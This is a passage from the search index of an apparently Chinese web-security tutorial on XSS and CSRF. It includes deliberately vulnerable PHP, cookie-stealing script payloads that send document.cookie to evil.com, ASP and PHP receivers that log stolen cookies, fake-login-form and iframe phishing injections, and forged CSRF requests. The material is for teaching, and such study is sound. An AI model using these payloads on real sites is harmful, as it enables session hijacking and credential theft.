            "text": "\u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002", 
            "title": "XSS \u7b80\u4ecb"
        }, 
        {
            "location": "/web/xss/#xss_1", 
            "text": "\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002  \u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002  \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a  ?php   // Is there any input?   if (   array_key_exists (   name ,   $_GET   )     $_GET [   name   ]   !=   NULL   )   {  \n     // Feedback for end user  \n     echo   pre Hello    .   $_GET [   name   ]   .   /pre ;   }   ?   \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86  name  \u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002", 
            "title": "\u53cd\u5c04\u578b XSS"
        }, 
        {
            "location": "/web/xss/#xss_2", 
            "text": "\u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002  \u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002  \u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a  ?php \n   if (   isset (   $_POST [   btnSign   ]   )   )   { \n     // Get input \n     $message   =   trim (   $_POST [   mtxMessage   ]   ); \n     $name      =   trim (   $_POST [   txtName   ]   ); \n     // Sanitize message input \n     $message   =   stripslashes (   $message   ); \n     $message   =   mysql_real_escape_string (   $message   ); \n     // Sanitize name input \n     $name   =   mysql_real_escape_string (   $name   ); \n     // Update database \n     $query    =   INSERT INTO guestbook ( comment, name ) VALUES (  $message ,  $name  ); ; \n     $result   =   mysql_query (   $query   )   or   die (   pre   .   mysql_error ()   .   /pre   ); \n     //mysql_close(); }  ?   \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002", 
            "title": "\u6301\u4e45\u578b XSS"
        }, 
        {
            "location": "/web/xss/#dom-xss", 
            "text": "\u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002  HTML \u4ee3\u7801\uff1a  html \n   head \n     title DOM-XSS test / title \n   / head \n   body \n     script \n       var   a = document . URL ; \n       document . write ( a . substring ( a . indexOf ( a= ) + 2 , a . length )); \n     / script \n   / body  / html   \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a  http://127.0.0.1/domXSS.html?a= script alert( XSS ) /script   \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002", 
            "title": "DOM XSS"
        }, 
        {
            "location": "/web/xss/#xss_3", 
            "text": "", 
            "title": "XSS \u5229\u7528\u65b9\u5f0f"
        }, 
        {
            "location": "/web/xss/#cookies", 
            "text": "\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a  script  document . location = http://www.evil.com/cookie.asp?cookie= + document . cookie  new   Image (). src = http://www.evil.com/cookie.asp?cookie= + document . cookie  / script  img   src = http://www.evil.com/cookie.asp?cookie= + document . cookie / img   \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a  %\n  msg=Request.ServerVariables( QUERY_STRING )\n  testfile=Server.MapPath( cookie.txt )\n  set fs=server.CreateObject( Scripting.filesystemobject )\n  set thisfile=fs.OpenTextFile(testfile,8,True,0)\n  thisfile.Writeline( msg   )\n  thisfile.close\n  set fs=nothing\n%   ?php  $cookie   =   $_GET [ cookie ];  $log   =   fopen ( cookie.txt ,   a );  fwrite ( $log ,   $cookie   .   \\n );  fclose ( $log );  ?   \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002", 
            "title": "Cookies \u7a83\u53d6"
        }, 
        {
            "location": "/web/xss/#_1", 
            "text": "\u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002  \u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002  \u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002", 
            "title": "\u4f1a\u8bdd\u52ab\u6301"
        }, 
        {
            "location": "/web/xss/#_2", 
            "text": "\u91cd\u5b9a\u5411\u9493\u9c7c  \u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002  http://www.bug.com/index.php?search= script document.location.href= http://www.evil.com /script     HTML \u6ce8\u5165\u5f0f\u9493\u9c7c  \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002  http://www.bug.com/index.php?search= html head title login /title /head body div style= text-align:center; form Method= POST  Action= phishing.php  Name= form br / br / Login: br/ input name= login  / br / Password: br/ input name= Password  type= password  / br/ br/ input name= Valid  value= Ok  type= submit  / br/ /form /div /body /html     \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002    iframe \u9493\u9c7c  \u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7  iframe  \u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002  http://www.bug.com/index.php?search= iframe src= http://www.evil.com  height= 100%  width= 100% /iframe     Flash \u9493\u9c7c  \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528  object  \u6216  embed  \u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002    \u9ad8\u7ea7\u9493\u9c7c\u6280\u672f  \u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002", 
            "title": "\u9493\u9c7c"
        }, 
        {
            "location": "/web/xss/#_3", 
            "text": "\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528  iframe  \u6807\u7b7e\u3002", 
            "title": "\u7f51\u9875\u6302\u9a6c"
        }, 
        {
            "location": "/web/xss/#dos-ddos", 
            "text": "\u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002", 
            "title": "DOS \u4e0e DDOS"
        }, 
        {
            "location": "/web/xss/#xss_4", 
            "text": "\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002", 
            "title": "XSS \u8815\u866b"
        }, 
        {
            "location": "/web/csrf/", 
            "text": "CSRF \u7b80\u4ecb\n\n\nCSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002\n\n\nCSRF \u7c7b\u578b\n\n\n\u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002\n\n\n\u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002\n\n\nHTML CSRF\n\n\n\u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002\n\n\nHTML \u4e2d\u80fd\u8bbe\u7f6e \nsrc/href\n \u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a\n\n\nlink\n \nhref\n=\n\n\nimg\n \nsrc\n=\n\n\nimg\n \nlowsrc\n=\n\n\nimg\n \ndynsrc\n=\n\n\nmeta\n \nhttp-equiv\n=\nrefresh\n \ncontent\n=\n0; url=\n\n\niframe\n \nsrc\n=\n\n\nframe\n \nsrc\n=\n\n\nscript\n \nsrc\n=\n/\nscript\n\n\nbgsound\n \nsrc\n=\n/\nbgsound\n\n\nembed\n \nsrc\n=\n/\nbgsound\n\n\nvideo\n \nsrc\n=\n/\nvideo\n\n\naudio\n \nsrc\n=\n/\naudio\n\n\na\n \nhref\n=\n/\na\n\n\ntable\n \nbackground\n=\n/\ntable\n\n......\n\n\n\n\n\u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a\n\n\n@\nimport\n \n\n\nbackground\n:\nurl\n(\n)\n\n\n......\n\n\n\n\n\n\u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002\n\n\nform\n \naction\n=\nhttp://www.a.com/register\n \nid\n=\nregister\n \nmethod\n=\npost\n\n  \ninput\n \ntype\n=\ntext\n \nname\n=\nusername\n \nvalue\n=\n \n/\n\n  \ninput\n \ntype\n=\npassword\n \nname\n=\npassword\n \nvalue\n=\n \n/\n\n\n/\nform\n\n\nscript\n\n  \nvar\n \nf\n \n=\n \ndocument\n.\ngetElementById\n(\nregister\n);\n\n  \nf\n.\ninputs\n[\n0\n].\nvalue\n \n=\n \ntest\n;\n\n  \nf\n.\ninputs\n[\n1\n].\nvalue\n \n=\n \npasswd\n;\n\n  \nf\n.\nsubmit\n();\n\n\n/\nscript\n\n\n\n\n\nFlash CSRF\n\n\nFlash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002\n\n\nimport\n \nflash\n.\nnet\n.\nURLRequest\n;\n\n\nimport\n \nflash\n.\nsystem\n.\nSecurity\n;\n\n\nvar\n \nurl\n \n=\n \nnew\n \nURLRequest\n(\nhttp://target/page\n);\n\n\nvar\n \nparam\n \n=\n \nnew\n \nURLVariables\n();\n\n\nparam\n \n=\n \ntest=123\n;\n\n\nurl\n.\nmethod\n \n=\n \nPOST\n;\n\n\nurl\n.\ndata\n \n=\n \nparam\n;\n\n\nsendToURL\n(\nurl\n);\n\n\nstop\n();\n\n\n\n\n\nFlash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528 \ngetURL\n\u3001\nloadVars\n \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002\n\n\nreq\n \n=\n \nnew\n \nLoadVars\n();\n\n\nreq\n.\naddRequestHeader\n(\nfoo\n,\n \nbar\n);\n\n\nreq\n.\nsend\n(\nhttp://target/page?v1=123\nv2=222\n,\n \n_blank\n,\n \nGET\n);\n\n\n\n\n\nCSRF \u7684\u9632\u5fa1\n\n\n\u9a8c\u8bc1\u7801\n\n\n\u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002\n\n\nReferer Check\n\n\n\u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002\n\n\nToken\n\n\nCSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002\n\n\n\u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002\n\n\nToken \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002\n\n\nToken \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002", 
            "title": "CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"
        }, 
        {
            "location": "/web/csrf/#csrf", 
            "text": "CSRF\uff0c\u5168\u540d Cross Site Request Forgery\uff0c\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u3002\u5f88\u5bb9\u6613\u5c06\u5b83\u4e0e XSS \u6df7\u6dc6\uff0c\u5bf9\u4e8e CSRF\uff0c\u5176\u4e24\u4e2a\u5173\u952e\u70b9\u662f\u8de8\u7ad9\u70b9\u7684\u8bf7\u6c42\u4e0e\u8bf7\u6c42\u7684\u4f2a\u9020\uff0c\u7531\u4e8e\u76ee\u6807\u7ad9\u65e0 token \u6216 referer \u9632\u5fa1\uff0c\u5bfc\u81f4\u7528\u6237\u7684\u654f\u611f\u64cd\u4f5c\u7684\u6bcf\u4e00\u4e2a\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u83b7\u77e5\uff0c\u653b\u51fb\u8005\u5373\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a\u5b8c\u5168\u4e00\u6837\u7684\u8bf7\u6c42\u4ee5\u7528\u6237\u7684\u8eab\u4efd\u8fbe\u5230\u6076\u610f\u76ee\u7684\u3002", 
            "title": "CSRF \u7b80\u4ecb"
        }, 
        {
            "location": "/web/csrf/#csrf_1", 
            "text": "\u6309\u8bf7\u6c42\u7c7b\u578b\uff0c\u53ef\u5206\u4e3a GET \u578b\u548c POST \u578b\u3002  \u6309\u653b\u51fb\u65b9\u5f0f\uff0c\u53ef\u5206\u4e3a HTML CSRF\u3001JSON HiJacking\u3001Flash CSRF \u7b49\u3002", 
            "title": "CSRF \u7c7b\u578b"
        }, 
        {
            "location": "/web/csrf/#html-csrf", 
            "text": "\u5229\u7528 HTML \u5143\u7d20\u53d1\u51fa CSRF \u8bf7\u6c42\uff0c\u8fd9\u662f\u6700\u5e38\u89c1\u7684 CSRF \u653b\u51fb\u3002  HTML \u4e2d\u80fd\u8bbe\u7f6e  src/href  \u7b49\u94fe\u63a5\u5730\u5740\u7684\u6807\u7b7e\u90fd\u53ef\u4ee5\u53d1\u8d77\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u5982\uff1a  link   href =  img   src =  img   lowsrc =  img   dynsrc =  meta   http-equiv = refresh   content = 0; url=  iframe   src =  frame   src =  script   src = / script  bgsound   src = / bgsound  embed   src = / bgsound  video   src = / video  audio   src = / audio  a   href = / a  table   background = / table \n......  \u8fd8\u6709 CSS \u6837\u5f0f\u4e2d\u7684\uff1a  @ import    background : url ( )  ......   \u4e5f\u53ef\u4f7f\u7528\u8868\u5355\u6765\u5bf9 POST \u578b\u7684\u8bf7\u6c42\u8fdb\u884c\u4f2a\u9020\u3002  form   action = http://www.a.com/register   id = register   method = post \n   input   type = text   name = username   value =   / \n   input   type = password   name = password   value =   /  / form  script \n   var   f   =   document . getElementById ( register ); \n   f . inputs [ 0 ]. value   =   test ; \n   f . inputs [ 1 ]. value   =   passwd ; \n   f . submit ();  / script", 
            "title": "HTML CSRF"
        }, 
        {
            "location": "/web/csrf/#flash-csrf", 
            "text": "Flash \u4e5f\u6709\u5404\u79cd\u65b9\u5f0f\u53ef\u4ee5\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\uff0c\u5305\u62ec POST\u3002  import   flash . net . URLRequest ;  import   flash . system . Security ;  var   url   =   new   URLRequest ( http://target/page );  var   param   =   new   URLVariables ();  param   =   test=123 ;  url . method   =   POST ;  url . data   =   param ;  sendToURL ( url );  stop ();   Flash \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528  getURL \u3001 loadVars  \u7b49\u65b9\u5f0f\u53d1\u8d77\u8bf7\u6c42\u3002  req   =   new   LoadVars ();  req . addRequestHeader ( foo ,   bar );  req . send ( http://target/page?v1=123 v2=222 ,   _blank ,   GET );", 
            "title": "Flash CSRF"
        }, 
        {
            "location": "/web/csrf/#csrf_2", 
            "text": "", 
            "title": "CSRF \u7684\u9632\u5fa1"
        }, 
        {
